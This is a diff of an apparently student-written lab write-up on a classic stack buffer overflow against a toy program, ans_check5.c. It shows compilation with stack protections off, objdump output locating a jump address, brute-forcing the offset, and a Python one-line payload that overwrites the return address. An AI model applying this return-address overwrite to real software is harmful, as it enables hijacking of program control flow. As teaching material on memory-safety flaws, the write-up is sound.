@@ -21,7 +21,7 @@ To do that, we need to overwrite the return address of strcpy function.
 gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
 ```
 
-2. Execute below to find out the address we want to jump
+2. Execute below to find out the address we want to jump. As you can see, 0x080485b3 is the address we want to jump!
 ```
 [02/09/22]seed@VM:Byeongchan$ objdump -D ans_check5 | grep -B 1 exit
 
@@ -31,12 +31,24 @@ gcc -g -z execstack -fno-stack-protector ans_check5.c -o ans_check5
  80485b5:	e8 46 fe ff ff       	call   8048400 <exit@plt>
 [02/09/22]seed@VM:Byeongchan$
 ```
-As you can see, 0x080485b3 is the address we want to jump!
 
-3. Prepare simple c program which execute strcpy() to a buffer with user input
+3. Find out where the return address of strcpy function is! This is where brute force method comes in! Try like below changing the number of print count. If the program ended without printing 'About to exit!', that means return address was corrupted and the program was killed by the system.
+```
+[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*47")
+ans_buf is at address 0xbf88027c
+Right answer!
+About to exit!
+Segmentation fault
+[02/09/22]seed@VM:Byeongchan$ ./ans_check5 $(python -c "print '0'*48")
+ans_buf is at address 0xbf8fe32c
+Segmentation fault
 
-5. 
+```
 
+4. Run like below. Python code will create meaning-less characters followed by exit return address. That return address will overwrite the return address of strcpy. If the program exit without 'Segmentation fault', then you found the right place!!!
+```
+ans_check5 $( python -c "print '\xAA'*48 + '\xb3\x85\x04\x08'") 
+```
 
 
 # ans_check5.c
